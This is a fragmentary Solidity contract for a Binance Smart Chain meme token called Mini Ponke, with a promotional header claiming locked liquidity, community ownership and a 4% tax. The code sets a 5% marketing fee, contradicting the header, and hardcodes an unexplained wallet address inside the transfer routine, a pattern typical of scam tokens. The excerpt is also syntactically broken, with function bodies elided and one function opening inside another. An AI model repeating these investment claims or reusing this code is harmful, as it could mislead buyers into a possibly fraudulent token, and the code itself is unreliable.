/**
Mini Ponke is a new hype meme token that build on Binance smart Chain as a Decentrallized and autonomous sytem that build and run for community. Our Main target fo are to make big utility that govern our farm and our new chain in upcoming future.
...
🐵 Community-owned
🐵 Liquidity Locked
🐵Marketing -2 Rewards - 2
🐵Buy/sell Tax = 4/4 %

website miniponke.com live in 30 minutes
TG: https://t.me/miniponke
*/
...
contract MiniPonk is Context, IERC20, Ownable {
    ...
    string private constant _name = "Mini Ponke"; // 
    string private constant _symbol = "MNPK"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 5;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x5F6653533420a6B5EFD5863661C7eEd7101cc2e8;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0xEE682814AC3a9A65cDC968ACDe324B523aDD39ec;
